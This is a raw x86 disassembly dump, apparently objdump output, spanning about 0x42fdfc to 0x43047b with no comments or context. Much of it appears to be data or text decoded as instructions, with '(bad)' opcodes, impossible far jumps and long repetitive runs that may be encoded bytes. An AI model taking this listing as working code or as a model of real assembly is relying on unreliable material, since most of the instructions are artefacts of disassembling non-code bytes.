  42fdfc:	and    bh,dh
  42fdfe:	add    al,BYTE PTR [eax]
  42fe00:	add    DWORD PTR [eax],eax
  42fe02:	add    BYTE PTR [eax],al
  42fe04:	add    DWORD PTR [eax],eax
  42fe06:	add    BYTE PTR [eax],al
  42fe08:	add    DWORD PTR [eax],eax
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	sbb    dh,bh
  42fe0e:	add    al,BYTE PTR [eax]
  42fe10:	sbb    al,0xfe
  42fe12:	add    al,BYTE PTR [eax]
  42fe14:	and    dh,bh
  42fe16:	add    al,BYTE PTR [eax]
  42fe18:	mov    ds:0x3200001a,eax
  42fe1d:	inc    BYTE PTR [edx]
  42fe1f:	add    BYTE PTR [eax],al
  42fe21:	add    BYTE PTR [ebx+0x65],dl
  42fe24:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  42fe28:	outs   dx,BYTE PTR ds:[esi]
  42fe29:	inc    esp
  42fe2a:	popa   
  42fe2b:	je     0x42fe8e
  42fe2d:	pop    edi
  42fe2e:	inc    ebp
  42fe2f:	js     0x42fea1
  42fe31:	add    BYTE PTR [edi+0x49],bl
  42fe34:	jae    0x42fe8d
  42fe36:	outs   dx,DWORD PTR ds:[esi]
  42fe37:	ja     0x42fe6f
  42fe39:	xor    al,0x4d
  42fe3b:	gs jae 0x42feb1
  42fe3e:	popa   
  42fe3f:	addr16 gs dec ecx
  42fe42:	jae    0x42fe9b
  42fe44:	outs   dx,DWORD PTR ds:[esi]
  42fe45:	ja     0x42fe7d
  42fe47:	xor    al,0x4d
  42fe49:	gs jae 0x42febf
  42fe4c:	popa   
  42fe4d:	addr16 gs inc eax
  42fe50:	xor    BYTE PTR [eax],al
  42fe52:	or     eax,0xc9c964a5
  42fe57:	adc    esi,DWORD PTR [ebp+0x55]
  42fe5a:	pop    ss
  42fe5b:	jne    0x42fec6
  42fe5d:	or     eax,0x61216975
  42fe62:	icebp  
  42fe63:	xchg   edi,eax
  42fe64:	or     eax,0x55ead669
  42fe69:	icebp  
  42fe6a:	xchg   edi,eax
  42fe6b:	or     eax,0xd6bb269
  42fe70:	jne    0x42fe04
  42fe72:	jmp    DWORD PTR [edx+0x750dfa91]
  42fe78:	xchg   bh,bh
  42fe7a:	mov    ds:0x750dfd3a,al
  42fe7f:	xchg   edx,eax
  42fe80:	jmp    DWORD PTR [edx+0x750df33b]
  42fe86:	xchg   edx,eax
  42fe87:	jmp    DWORD PTR [edx+0x22574956]
  42fe8d:	xchg   BYTE PTR [ecx-0x5b],ah
  42fe90:	or     eax,0xd264d664
  42fe95:	pop    edi
  42fe96:	popa   
  42fe97:	popa   
  42fe98:	(bad)  
  42fe99:	jmp    0xb269:0x1e2ad9a
  42fea0:	xchg   ecx,eax
  42fea1:	(bad)  
  42fea2:	jmp    0xe769:0x1e22586
  42fea9:	xor    al,0xf0
  42feab:	mov    cl,0x8d
  42fead:	popa   
  42feae:	popa   
  42feaf:	or     eax,0xe2178e75
  42feb4:	out    0x62,eax
  42feb6:	bound  esp,QWORD PTR [edx+0x14]
  42feb9:	(bad)  
  42febb:	popa   
  42febc:	popa   
  42febd:	xchg   esp,eax
  42febe:	pop    ss
  42febf:	loop   0x42fe5b
  42fec1:	bound  esp,QWORD PTR [edx+0x62]
  42fec4:	adc    al,0x34
  42fec6:	int3   
  42fec7:	popa   
  42fec8:	popa   
  42fec9:	xchg   esp,eax
  42feca:	pop    ss
  42fecb:	loop   0x42fe5d
  42fecd:	bound  esp,QWORD PTR [edx+0x62]
  42fed0:	adc    al,0xdd
  42fed2:	int3   
  42fed3:	popa   
  42fed4:	popa   
  42fed5:	xchg   esp,eax
  42fed6:	pop    ss
  42fed7:	loop   0x42fe5f
  42fed9:	bound  esp,QWORD PTR [edx+0x62]
  42fedc:	adc    al,0xaa
  42fede:	int3   
  42fedf:	popa   
  42fee0:	popa   
  42fee1:	xchg   esp,eax
  42fee2:	pop    ss
  42fee3:	loop   0x42fe71
  42fee5:	bound  esp,QWORD PTR [edx+0x62]
  42fee8:	adc    al,0x7a
  42feea:	int3   
  42feeb:	popa   
  42feec:	popa   
  42feed:	xchg   esp,eax
  42feee:	pop    ss
  42feef:	loop   0x42fe83
  42fef1:	bound  esp,QWORD PTR [edx+0x62]
  42fef4:	adc    al,0xab
  42fef6:	int3   
  42fef7:	popa   
  42fef8:	popa   
  42fef9:	xchg   esp,eax
  42fefa:	pop    ss
  42fefb:	loop   0x42fe85
  42fefd:	bound  esp,QWORD PTR [edx+0x62]
  42ff00:	adc    al,0x17
  42ff02:	shl    DWORD PTR [ecx+0x61],cl
  42ff05:	xchg   esp,eax
  42ff06:	pop    ss
  42ff07:	loop   0x42ff87
  42ff09:	bound  esp,QWORD PTR [edx+0x62]
  42ff0c:	adc    al,0x9e
  42ff0e:	int3   
  42ff0f:	popa   
  42ff10:	popa   
  42ff11:	xchg   esp,eax
  42ff12:	pop    ss
  42ff13:	loop   0x42ff7f
  42ff15:	bound  esp,QWORD PTR [edx+0x62]
  42ff18:	adc    al,0xd
  42ff1a:	shl    DWORD PTR [ecx+0x61],cl
  42ff1d:	xchg   esp,eax
  42ff1e:	pop    ss
  42ff1f:	loop   0x42feab
  42ff21:	bound  esp,QWORD PTR [edx+0x62]
  42ff24:	adc    al,0x85
  42ff26:	int3   
  42ff27:	popa   
  42ff28:	popa   
  42ff29:	xchg   esp,eax
  42ff2a:	pop    ss
  42ff2b:	loop   0x42fead
  42ff2d:	bound  esp,QWORD PTR [edx+0x62]
  42ff30:	adc    al,0x34
  42ff32:	int3   
  42ff33:	popa   
  42ff34:	popa   
  42ff35:	xchg   esp,eax
  42ff36:	pop    ss
  42ff37:	loop   0x42ffaf
  42ff39:	bound  esp,QWORD PTR [edx+0x62]
  42ff3c:	adc    al,0x32
  42ff3e:	int3   
  42ff3f:	popa   
  42ff40:	popa   
  42ff41:	xchg   esp,eax
  42ff42:	pop    ss
  42ff43:	loop   0x42ffc1
  42ff45:	bound  esp,QWORD PTR [edx+0x62]
  42ff48:	adc    al,0xd1
  42ff4a:	jno    0x42ffad
  42ff4c:	popa   
  42ff4d:	xchg   esp,eax
  42ff4e:	pop    ss
  42ff4f:	loop   0x42ff4c
  42ff51:	bound  esp,QWORD PTR [edx+0x62]
  42ff54:	adc    al,0xb1
  42ff56:	and    BYTE PTR [ecx+0x61],0x94
  42ff5a:	pop    ss
  42ff5b:	loop   0x42ffd5
  42ff5d:	bound  esp,QWORD PTR [edx+0x62]
  42ff60:	adc    al,0xac
  42ff62:	cmp    esp,DWORD PTR [ecx+0x61]
  42ff65:	xchg   esp,eax
  42ff66:	pop    ss
  42ff67:	loop   0x42fef7
  42ff69:	bound  esp,QWORD PTR [edx+0x62]
  42ff6c:	adc    al,0x77
  42ff6e:	fbld   TBYTE PTR [ecx+0x61]
  42ff71:	xchg   esp,eax
  42ff72:	pop    ss
  42ff73:	loop   0x42ff49
  42ff75:	bound  esp,QWORD PTR [edx+0x62]
  42ff78:	adc    al,0xa3
  42ff7a:	int3   
  42ff7b:	popa   
  42ff7c:	popa   
  42ff7d:	xchg   esp,eax
  42ff7e:	pop    ss
  42ff7f:	loop   0x42ffb9
  42ff81:	bound  esp,QWORD PTR [edx+0x62]
  42ff84:	adc    al,0xe6
  42ff86:	int3   
  42ff87:	popa   
  42ff88:	popa   
  42ff89:	xchg   esp,eax
  42ff8a:	pop    ss
  42ff8b:	loop   0x42ff5f
  42ff8d:	bound  esp,QWORD PTR [edx+0x62]
  42ff90:	adc    al,0x34
  42ff92:	int3   
  42ff93:	popa   
  42ff94:	popa   
  42ff95:	xchg   esp,eax
  42ff96:	pop    ss
  42ff97:	loop   0x42ff61
  42ff99:	bound  esp,QWORD PTR [edx+0x62]
  42ff9c:	adc    al,0xe3
  42ff9e:	int3   
  42ff9f:	popa   
  42ffa0:	popa   
  42ffa1:	xchg   esp,eax
  42ffa2:	pop    ss
  42ffa3:	loop   0x42ff63
  42ffa5:	bound  esp,QWORD PTR [edx+0x62]
  42ffa8:	adc    al,0xa1
  42ffaa:	int3   
  42ffab:	popa   
  42ffac:	popa   
  42ffad:	xchg   esp,eax
  42ffae:	pop    ss
  42ffaf:	loop   0x42ff55
  42ffb1:	bound  esp,QWORD PTR [edx+0x62]
  42ffb4:	adc    al,0xe5
  42ffb6:	int3   
  42ffb7:	popa   
  42ffb8:	popa   
  42ffb9:	xchg   esp,eax
  42ffba:	pop    ss
  42ffbb:	loop   0x42ff87
  42ffbd:	bound  esp,QWORD PTR [edx+0x62]
  42ffc0:	adc    al,0x9d
  42ffc2:	int3   
  42ffc3:	popa   
  42ffc4:	popa   
  42ffc5:	xchg   esp,eax
  42ffc6:	pop    ss
  42ffc7:	loop   0x42ff89
  42ffc9:	bound  esp,QWORD PTR [edx+0x62]
  42ffcc:	adc    al,0xc5
  42ffce:	int3   
  42ffcf:	popa   
  42ffd0:	popa   
  42ffd1:	xchg   esp,eax
  42ffd2:	pop    ss
  42ffd3:	loop   0x42ff8b
  42ffd5:	bound  esp,QWORD PTR [edx+0x62]
  42ffd8:	adc    al,0xaf
  42ffda:	int3   
  42ffdb:	popa   
  42ffdc:	popa   
  42ffdd:	xchg   esp,eax
  42ffde:	pop    ss
  42ffdf:	loop   0x42ff9d
  42ffe1:	bound  esp,QWORD PTR [edx+0x62]
  42ffe4:	adc    al,0xe0
  42ffe6:	int3   
  42ffe7:	popa   
  42ffe8:	popa   
  42ffe9:	xchg   esp,eax
  42ffea:	pop    ss
  42ffeb:	loop   0x43002d
  42ffed:	bound  esp,QWORD PTR [edx+0x62]
  42fff0:	adc    al,0x9e
  42fff2:	int3   
  42fff3:	popa   
  42fff4:	popa   
  42fff5:	xchg   esp,eax
  42fff6:	pop    ss
  42fff7:	loop   0x42ffb1
  42fff9:	bound  esp,QWORD PTR [edx+0x62]
  42fffc:	adc    al,0x34
  42fffe:	int3   
  42ffff:	popa   
  430000:	popa   
  430001:	xchg   esp,eax
  430002:	pop    ss
  430003:	loop   0x42ffd3
  430005:	bound  esp,QWORD PTR [edx+0x62]
  430008:	adc    al,0x38
  43000a:	int3   
  43000b:	popa   
  43000c:	popa   
  43000d:	xchg   esp,eax
  43000e:	pop    ss
  43000f:	loop   0x42ffa5
  430011:	bound  esp,QWORD PTR [edx+0x62]
  430014:	adc    al,0xcc
  430016:	inc    ebp
  430017:	popa   
  430018:	popa   
  430019:	xchg   esp,eax
  43001a:	pop    ss
  43001b:	loop   0x430097
  43001d:	bound  esp,QWORD PTR [edx+0x62]
  430020:	adc    al,0xd3
  430022:	es popa 
  430024:	popa   
  430025:	xchg   esp,eax
  430026:	pop    ss
  430027:	loop   0x430099
  430029:	bound  esp,QWORD PTR [edx+0x62]
  43002c:	adc    al,0xdc
  43002e:	dec    eax
  43002f:	popa   
  430030:	popa   
  430031:	xchg   esp,eax
  430032:	pop    ss
  430033:	loop   0x43001b
  430035:	bound  esp,QWORD PTR [edx+0x62]
  430038:	adc    al,0xdf
  43003a:	xor    DWORD PTR [ecx+0x61],esp
  43003d:	xchg   esp,eax
  43003e:	pop    ss
  43003f:	loop   0x4300ad
  430041:	bound  esp,QWORD PTR [edx+0x62]
  430044:	adc    al,0xa3
  430046:	int3   
  430047:	popa   
  430048:	popa   
  430049:	xchg   esp,eax
  43004a:	pop    ss
  43004b:	loop   0x430038
  43004d:	bound  esp,QWORD PTR [edx+0x62]
  430050:	adc    al,0xc5
  430052:	int3   
  430053:	popa   
  430054:	popa   
  430055:	xchg   esp,eax
  430056:	pop    ss
  430057:	jne    0x430034
  430059:	adc    al,0x34
  43005b:	int3   
  43005c:	popa   
  43005d:	popa   
  43005e:	xchg   esp,eax
  43005f:	pop    ss
  430060:	jne    0x43003b
  430062:	adc    al,0xe0
  430064:	int3   
  430065:	popa   
  430066:	popa   
  430067:	xchg   esp,eax
  430068:	pop    ss
  430069:	jne    0x4300d9
  43006b:	adc    al,0x9c
  43006d:	int3   
  43006e:	popa   
  43006f:	popa   
  430070:	xchg   esp,eax
  430071:	pop    ss
  430072:	jne    0x430029
  430074:	adc    al,0xe5
  430076:	int3   
  430077:	popa   
  430078:	popa   
  430079:	xchg   esp,eax
  43007a:	pop    ss
  43007b:	jne    0x430081
  43007d:	adc    al,0xa8
  43007f:	int3   
  430080:	popa   
  430081:	popa   
  430082:	xchg   esp,eax
  430083:	pop    ss
  430084:	jne    0x4300a0
  430086:	adc    al,0xe6
  430088:	int3   
  430089:	popa   
  43008a:	popa   
  43008b:	xchg   esp,eax
  43008c:	pop    ss
  43008d:	jne    0x43009f
  43008f:	adc    al,0x72
  430091:	int3   
  430092:	popa   
  430093:	popa   
  430094:	xchg   esp,eax
  430095:	pop    ss
  430096:	jne    0x4300a6
  430098:	adc    al,0xe3
  43009a:	int3   
  43009b:	popa   
  43009c:	popa   
  43009d:	xchg   esp,eax
  43009e:	pop    ss
  43009f:	jne    0x4300ad
  4300a1:	adc    al,0x9e
  4300a3:	int3   
  4300a4:	popa   
  4300a5:	popa   
  4300a6:	xchg   esp,eax
  4300a7:	pop    ss
  4300a8:	jne    0x4300bc
  4300aa:	adc    al,0x34
  4300ac:	int3   
  4300ad:	popa   
  4300ae:	popa   
  4300af:	xchg   esp,eax
  4300b0:	pop    ss
  4300b1:	jne    0x43009c
  4300b3:	adc    al,0x38
  4300b5:	int3   
  4300b6:	popa   
  4300b7:	popa   
  4300b8:	xchg   esp,eax
  4300b9:	pop    ss
  4300ba:	jne    0x4300ab
  4300bc:	adc    al,0xcc
  4300be:	inc    ebp
  4300bf:	popa   
  4300c0:	popa   
  4300c1:	xchg   esp,eax
  4300c2:	pop    ss
  4300c3:	jne    0x4300ba
  4300c5:	adc    al,0xd3
  4300c7:	es popa 
  4300c9:	popa   
  4300ca:	xchg   esp,eax
  4300cb:	pop    ss
  4300cc:	jne    0x4300d8
  4300ce:	adc    al,0xdc
  4300d0:	dec    eax
  4300d1:	popa   
  4300d2:	popa   
  4300d3:	xchg   esp,eax
  4300d4:	pop    ss
  4300d5:	jne    0x4300d8
  4300d7:	adc    al,0xdf
  4300d9:	xor    DWORD PTR [ecx+0x61],esp
  4300dc:	xchg   esp,eax
  4300dd:	pop    ss
  4300de:	jne    0x4300e7
  4300e0:	adc    al,0xa3
  4300e2:	int3   
  4300e3:	popa   
  4300e4:	popa   
  4300e5:	xchg   esp,eax
  4300e6:	pop    ss
  4300e7:	jne    0x4300e6
  4300e9:	adc    al,0xdf
  4300eb:	int3   
  4300ec:	popa   
  4300ed:	popa   
  4300ee:	xchg   esp,eax
  4300ef:	pop    ss
  4300f0:	jne    0x430146
  4300f2:	adc    al,0x34
  4300f4:	int3   
  4300f5:	popa   
  4300f6:	popa   
  4300f7:	xchg   esp,eax
  4300f8:	pop    ss
  4300f9:	jne    0x430155
  4300fb:	adc    al,0xe0
  4300fd:	int3   
  4300fe:	popa   
  4300ff:	popa   
  430100:	xchg   esp,eax
  430101:	pop    ss
  430102:	jne    0x430128
  430104:	adc    al,0xaa
  430106:	int3   
  430107:	popa   
  430108:	popa   
  430109:	xchg   esp,eax
  43010a:	pop    ss
  43010b:	jne    0x4300c8
  43010d:	adc    al,0xde
  43010f:	int3   
  430110:	popa   
  430111:	popa   
  430112:	xchg   esp,eax
  430113:	pop    ss
  430114:	jne    0x4300c7
  430116:	adc    al,0xa8
  430118:	int3   
  430119:	popa   
  43011a:	popa   
  43011b:	xchg   esp,eax
  43011c:	pop    ss
  43011d:	jne    0x4300d6
  43011f:	adc    al,0xdd
  430121:	int3   
  430122:	popa   
  430123:	popa   
  430124:	xchg   esp,eax
  430125:	pop    ss
  430126:	jne    0x4300d5
  430128:	adc    al,0x2d
  43012a:	int3   
  43012b:	popa   
  43012c:	popa   
  43012d:	xchg   esp,eax
  43012e:	pop    ss
  43012f:	jne    0x4300e4
  430131:	adc    al,0x13
  430133:	shl    DWORD PTR [ecx+0x61],cl
  430136:	xchg   esp,eax
  430137:	pop    ss
  430138:	jne    0x430142
  43013a:	adc    al,0x38
  43013c:	int3   
  43013d:	popa   
  43013e:	popa   
  43013f:	xchg   esp,eax
  430140:	pop    ss
  430141:	jne    0x430149
  430143:	adc    al,0x34
  430145:	int3   
  430146:	popa   
  430147:	popa   
  430148:	xchg   esp,eax
  430149:	pop    ss
  43014a:	jne    0x430160
  43014c:	adc    al,0x37
  43014e:	int3   
  43014f:	popa   
  430150:	popa   
  430151:	xchg   esp,eax
  430152:	pop    ss
  430153:	jne    0x43017f
  430155:	adc    al,0xcc
  430157:	mul    DWORD PTR [ecx+0x61]
  43015a:	xchg   esp,eax
  43015b:	pop    ss
  43015c:	jne    0x43017e
  43015e:	adc    al,0xdc
  430160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430161:	popa   
  430162:	popa   
  430163:	xchg   esp,eax
  430164:	pop    ss
  430165:	jne    0x430185
  430167:	adc    al,0x83
  430169:	mov    ecx,0x17946161
  43016e:	jne    0x43018c
  430170:	adc    al,0xec
  430172:	outs   dx,DWORD PTR ds:[esi]
  430173:	popa   
  430174:	popa   
  430175:	xchg   esp,eax
  430176:	pop    ss
  430177:	jne    0x43019b
  430179:	adc    al,0xa3
  43017b:	int3   
  43017c:	popa   
  43017d:	popa   
  43017e:	xchg   esp,eax
  43017f:	pop    ss
  430180:	jne    0x43017b
  430182:	adc    al,0xe3
  430184:	int3   
  430185:	popa   
  430186:	popa   
  430187:	xchg   esp,eax
  430188:	pop    ss
  430189:	loop   0x430131
  43018b:	bound  esp,QWORD PTR [edx+0x62]
  43018e:	adc    al,0x34
  430190:	int3   
  430191:	popa   
  430192:	popa   
  430193:	xchg   esp,eax
  430194:	pop    ss
  430195:	loop   0x4301c9
  430197:	bound  esp,QWORD PTR [edx+0x62]
  43019a:	adc    al,0xc5
  43019c:	int3   
  43019d:	popa   
  43019e:	popa   
  43019f:	xchg   esp,eax
  4301a0:	pop    ss
  4301a1:	loop   0x430215
  4301a3:	bound  esp,QWORD PTR [edx+0x62]
  4301a6:	adc    al,0xa1
  4301a8:	int3   
  4301a9:	popa   
  4301aa:	popa   
  4301ab:	xchg   esp,eax
  4301ac:	pop    ss
  4301ad:	loop   0x430157
  4301af:	bound  esp,QWORD PTR [edx+0x62]
  4301b2:	adc    al,0xdc
  4301b4:	int3   
  4301b5:	popa   
  4301b6:	popa   
  4301b7:	xchg   esp,eax
  4301b8:	pop    ss
  4301b9:	loop   0x430159
  4301bb:	bound  esp,QWORD PTR [edx+0x62]
  4301be:	adc    al,0x9d
  4301c0:	int3   
  4301c1:	popa   
  4301c2:	popa   
  4301c3:	xchg   esp,eax
  4301c4:	pop    ss
  4301c5:	loop   0x43014b
  4301c7:	bound  esp,QWORD PTR [edx+0x62]
  4301ca:	adc    al,0x7
  4301cc:	shl    DWORD PTR [ecx+0x61],cl
  4301cf:	xchg   esp,eax
  4301d0:	pop    ss
  4301d1:	loop   0x43017d
  4301d3:	bound  esp,QWORD PTR [edx+0x62]
  4301d6:	adc    al,0x72
  4301d8:	int3   
  4301d9:	popa   
  4301da:	popa   
  4301db:	xchg   esp,eax
  4301dc:	pop    ss
  4301dd:	loop   0x43017f
  4301df:	bound  esp,QWORD PTR [edx+0x62]
  4301e2:	adc    al,0xe1
  4301e4:	int3   
  4301e5:	popa   
  4301e6:	popa   
  4301e7:	xchg   esp,eax
  4301e8:	pop    ss
  4301e9:	loop   0x430181
  4301eb:	bound  esp,QWORD PTR [edx+0x62]
  4301ee:	adc    al,0xa9
  4301f0:	int3   
  4301f1:	popa   
  4301f2:	popa   
  4301f3:	xchg   esp,eax
  4301f4:	pop    ss
  4301f5:	loop   0x430193
  4301f7:	bound  esp,QWORD PTR [edx+0x62]
  4301fa:	adc    al,0x34
  4301fc:	int3   
  4301fd:	popa   
  4301fe:	popa   
  4301ff:	xchg   esp,eax
  430200:	pop    ss
  430201:	loop   0x4301a5
  430203:	bound  esp,QWORD PTR [edx+0x62]
  430206:	adc    al,0x84
  430208:	int3   
  430209:	popa   
  43020a:	popa   
  43020b:	xchg   esp,eax
  43020c:	pop    ss
  43020d:	loop   0x4301a7
  43020f:	bound  esp,QWORD PTR [edx+0x62]
  430212:	adc    al,0xcc
  430214:	mul    DWORD PTR [ecx+0x61]
  430217:	xchg   esp,eax
  430218:	pop    ss
  430219:	loop   0x430247
  43021b:	bound  esp,QWORD PTR [edx+0x62]
  43021e:	adc    al,0xdc
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	popa   
  430222:	popa   
  430223:	xchg   esp,eax
  430224:	pop    ss
  430225:	loop   0x43029b
  430227:	bound  esp,QWORD PTR [edx+0x62]
  43022a:	adc    al,0x83
  43022c:	mov    ecx,0x17946161
  430231:	loop   0x43020d
  430233:	bound  esp,QWORD PTR [edx+0x62]
  430236:	adc    al,0xec
  430238:	outs   dx,DWORD PTR ds:[esi]
  430239:	popa   
  43023a:	popa   
  43023b:	xchg   esp,eax
  43023c:	pop    ss
  43023d:	loop   0x43020f
  43023f:	bound  esp,QWORD PTR [edx+0x62]
  430242:	adc    al,0xa3
  430244:	int3   
  430245:	popa   
  430246:	popa   
  430247:	xchg   esp,eax
  430248:	pop    ss
  430249:	loop   0x430211
  43024b:	bound  esp,QWORD PTR [edx+0x62]
  43024e:	adc    al,0xe7
  430250:	int3   
  430251:	popa   
  430252:	popa   
  430253:	xchg   esp,eax
  430254:	pop    ss
  430255:	jne    0x4302af
  430257:	adc    al,0x34
  430259:	int3   
  43025a:	popa   
  43025b:	popa   
  43025c:	xchg   esp,eax
  43025d:	pop    ss
  43025e:	jne    0x4302a6
  430260:	adc    al,0xde
  430262:	int3   
  430263:	popa   
  430264:	popa   
  430265:	xchg   esp,eax
  430266:	pop    ss
  430267:	jne    0x430291
  430269:	adc    al,0xa3
  43026b:	int3   
  43026c:	popa   
  43026d:	popa   
  43026e:	xchg   esp,eax
  43026f:	pop    ss
  430270:	jne    0x430298
  430272:	adc    al,0x7a
  430274:	int3   
  430275:	popa   
  430276:	popa   
  430277:	xchg   esp,eax
  430278:	pop    ss
  430279:	jne    0x4302cb
  43027b:	adc    al,0x72
  43027d:	int3   
  43027e:	popa   
  43027f:	popa   
  430280:	xchg   esp,eax
  430281:	pop    ss
  430282:	jne    0x4302c2
  430284:	adc    al,0xe1
  430286:	int3   
  430287:	popa   
  430288:	popa   
  430289:	xchg   esp,eax
  43028a:	pop    ss
  43028b:	jne    0x4302c9
  43028d:	adc    al,0x2e
  43028f:	int3   
  430290:	popa   
  430291:	popa   
  430292:	xchg   esp,eax
  430293:	pop    ss
  430294:	jne    0x4302d8
  430296:	adc    al,0x34
  430298:	int3   
  430299:	popa   
  43029a:	popa   
  43029b:	xchg   esp,eax
  43029c:	pop    ss
  43029d:	jne    0x4302e7
  43029f:	adc    al,0x2d
  4302a1:	int3   
  4302a2:	popa   
  4302a3:	popa   
  4302a4:	xchg   esp,eax
  4302a5:	pop    ss
  4302a6:	jne    0x4302de
  4302a8:	adc    al,0x0
  4302aa:	das    
  4302ab:	popa   
  4302ac:	popa   
  4302ad:	xchg   esp,eax
  4302ae:	pop    ss
  4302af:	jne    0x4302c9
  4302b1:	adc    al,0x7
  4302b3:	jae    0x430316
  4302b5:	popa   
  4302b6:	xchg   esp,eax
  4302b7:	pop    ss
  4302b8:	jne    0x4302d0
  4302ba:	adc    al,0x1
  4302bc:	jmp    0x43031f
  4302be:	popa   
  4302bf:	xchg   esp,eax
  4302c0:	pop    ss
  4302c1:	jne    0x4302b6
  4302c3:	adc    al,0x19
  4302c5:	push   ecx
  4302c6:	popa   
  4302c7:	popa   
  4302c8:	xchg   esp,eax
  4302c9:	pop    ss
  4302ca:	jne    0x4302bd
  4302cc:	adc    al,0xdd
  4302ce:	fbld   TBYTE PTR [ecx+0x61]
  4302d1:	xchg   esp,eax
  4302d2:	pop    ss
  4302d3:	jne    0x430339
  4302d5:	adc    al,0xd1
  4302d7:	jno    0x43033a
  4302d9:	popa   
  4302da:	xchg   esp,eax
  4302db:	pop    ss
  4302dc:	jne    0x4302cb
  4302de:	adc    al,0x9c
  4302e0:	int3   
  4302e1:	popa   
  4302e2:	popa   
  4302e3:	xchg   esp,eax
  4302e4:	pop    ss
  4302e5:	jne    0x430318
  4302e7:	or     eax,0x6262e7e2
  4302ec:	bound  ecx,QWORD PTR ds:0x616850db
  4302f2:	popa   
  4302f3:	or     eax,0x17610d61
  4302f8:	loop   0x4302dd
  4302fa:	bound  esp,QWORD PTR [edx+0x62]
  4302fd:	push   DWORD PTR [ebp+0x60]
  430300:	cmp    al,0xff
  430302:	jne    0x43035b
  430304:	dec    ecx
  430305:	push   DWORD PTR [ebp+0x4e]
  430308:	push   DWORD PTR ss:[ebp+0x4d]
  43030c:	and    al,0xff
  43030e:	jne    0x43035c
  430310:	mov    al,0xff
  430312:	jne    0x430367
  430314:	loopne 0x430315
  430316:	jne    0x430381
  430318:	in     eax,dx
  430319:	push   DWORD PTR [ebp+0x30]
  43031c:	repz push DWORD PTR [ebp+0x67]
  430320:	inc    edx
  430321:	push   DWORD PTR [ebp+0x5e]
  430324:	lock push DWORD PTR [ebp+0x55]
  430328:	and    al,0xff
  43032a:	jne    0x430388
  43032c:	mov    al,0xff
  43032e:	jne    0x430393
  430330:	loopne 0x430331
  430332:	loop   0x4302e5
  430334:	arpl   WORD PTR [edx+0x62],sp
  430337:	repz jmp edx
  43033a:	lods   al,BYTE PTR ds:[esi]
  43033b:	arpl   WORD PTR [edx+0x62],sp
  43033e:	xor    eax,0x63b7e2ff
  430343:	bound  esp,QWORD PTR [edx-0x3e]
  430346:	jmp    edx
  430348:	mov    edx,0x64626263
  43034d:	jmp    edx
  43034f:	lods   eax,DWORD PTR ds:[esi]
  430350:	arpl   WORD PTR [edx+0x62],sp
  430353:	notrack jmp edx
  430356:	das    
  430357:	arpl   WORD PTR [edx+0x62],sp
  43035a:	out    dx,al
  43035b:	jmp    edx
  43035d:	mov    bl,0x63
  43035f:	bound  esp,QWORD PTR [edx+0x36]
  430362:	jmp    edx
  430364:	and    eax,0xe0626263
  430369:	or     eax,0xb859a75
  43036e:	call   0xa8e8:0x5e343ac9
  430375:	popa   
  430376:	pop    ss
  430377:	loop   0x43039d
  430379:	arpl   WORD PTR [edx+0x62],sp
  43037c:	out    dx,al
  43037d:	xchg   DWORD PTR ds:0xb858675,ecx
  430383:	call   0x6324:0x130d3ac9
  43038a:	bound  esp,QWORD PTR [edx+0x13]
  43038d:	outs   dx,BYTE PTR ds:[esi]
  43038e:	push   0x61a8e85e
  430393:	pop    ss
  430394:	loop   0x4303ba
  430396:	arpl   WORD PTR [edx+0x62],sp
  430399:	fsub   DWORD PTR [ebx]
  43039b:	and    al,0x63
  43039d:	bound  esp,QWORD PTR [edx+0x3b]
  4303a0:	jae    0x430325
  4303a2:	or     eax,0x626324e2
  4303a7:	bound  edx,QWORD PTR [ebx+0x60342c06]
  4303ad:	test   eax,ebx
  4303af:	popa   
  4303b0:	popa   
  4303b1:	popa   
  4303b2:	fcomp  DWORD PTR [edx+ebx*4]
  4303b5:	or     eax,0x62632413
  4303ba:	bound  eax,QWORD PTR [esp+ebp*1]
  4303bd:	lea    esp,[eax-0x12]
  4303c0:	and    ecx,DWORD PTR ds:0xb859a75
  4303c6:	call   0xa8e8:0x5e343ac9
  4303cd:	popa   
  4303ce:	pop    ss
  4303cf:	loop   0x430425
  4303d1:	arpl   WORD PTR [edx+0x62],sp
  4303d4:	out    dx,al
  4303d5:	xchg   DWORD PTR ds:0xb858675,ecx
  4303db:	call   0x6354:0x130d3ac9
  4303e2:	bound  esp,QWORD PTR [edx+0x13]
  4303e5:	outs   dx,BYTE PTR ds:[esi]
  4303e6:	push   0x61a8e85e
  4303eb:	pop    ss
  4303ec:	loop   0x430442
  4303ee:	arpl   WORD PTR [edx+0x62],sp
  4303f1:	fsub   DWORD PTR [ebx]
  4303f3:	push   esp
  4303f4:	arpl   WORD PTR [edx+0x62],sp
  4303f7:	cmp    dh,BYTE PTR [ebx-0x7d]
  4303fa:	or     eax,0x626354e2
  4303ff:	bound  edx,QWORD PTR [ebx+0x69342c06]
  430405:	test   eax,ebx
  430407:	popa   
  430408:	popa   
  430409:	popa   
  43040a:	fcomp  DWORD PTR [edx+ebx*4]
  43040d:	or     eax,0x62635413
  430412:	bound  eax,QWORD PTR [esp+ebp*1]
  430415:	lea    ebp,[ecx-0x12]
  430418:	and    ecx,DWORD PTR ds:0xb859a75
  43041e:	call   0xa8e8:0x5e343ac9
  430425:	popa   
  430426:	pop    ss
  430427:	loop   0x430426
  430429:	arpl   WORD PTR [edx+0x62],sp
  43042c:	out    dx,al
  43042d:	xchg   DWORD PTR ds:0xb858675,ecx
  430433:	call   0x63fd:0x130d3ac9
  43043a:	bound  esp,QWORD PTR [edx+0x13]
  43043d:	outs   dx,BYTE PTR ds:[esi]
  43043e:	push   0x61a8e85e
  430443:	pop    ss
  430444:	loop   0x430443
  430446:	arpl   WORD PTR [edx+0x62],sp
  430449:	fsub   DWORD PTR [ebx]
  43044b:	std    
  43044c:	arpl   WORD PTR [edx+0x62],sp
  43044f:	call   0x63fd:0xe20dd573
  430456:	bound  esp,QWORD PTR [edx-0x6d]
  430459:	push   es
  43045a:	outs   dx,BYTE PTR ds:[esi]
  43045b:	xor    al,0xb1
  43045d:	arpl   WORD PTR [edx+0x62],sp
  430460:	test   eax,ebx
  430462:	popa   
  430463:	popa   
  430464:	popa   
  430465:	fcomp  DWORD PTR [edx+ebx*4]
  430468:	or     eax,0x6263fd13
  43046d:	bound  eax,QWORD PTR [esi+ebp*2]
  430470:	lea    esi,[ecx-0x119d9d9d]
  430476:	repnz adc esi,DWORD PTR [ebp+0x5d]
  43047a:	pop    ss
  43047b:	loop   0x430474
